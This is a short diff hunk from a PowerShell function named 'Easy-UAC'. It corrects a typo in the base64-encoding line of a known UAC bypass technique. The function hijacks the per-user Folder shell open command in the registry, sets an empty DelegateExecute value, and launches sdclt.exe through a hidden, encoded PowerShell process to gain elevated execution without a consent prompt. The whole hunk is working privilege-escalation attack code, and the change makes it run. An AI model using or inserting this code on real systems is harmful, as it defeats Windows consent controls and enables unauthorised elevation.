@@ -20,7 +20,7 @@ function Easy-UAC {
 	New-Item -Path $Path -Value '%A%'
 	New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value $Path
 	New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-	$startcommand = [Enciding]::ToBase64String([Text.Encoding]::ASCII.GetBytes("start sdclt.exe"))
+	$startcommand = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("start sdclt.exe"))
 	sleep 7
 	Start-Process cmd.exe "/c start /min powershell.exe -windowstyle hidden -enc $startcommand" -NoNewWindow
 	sleep 2
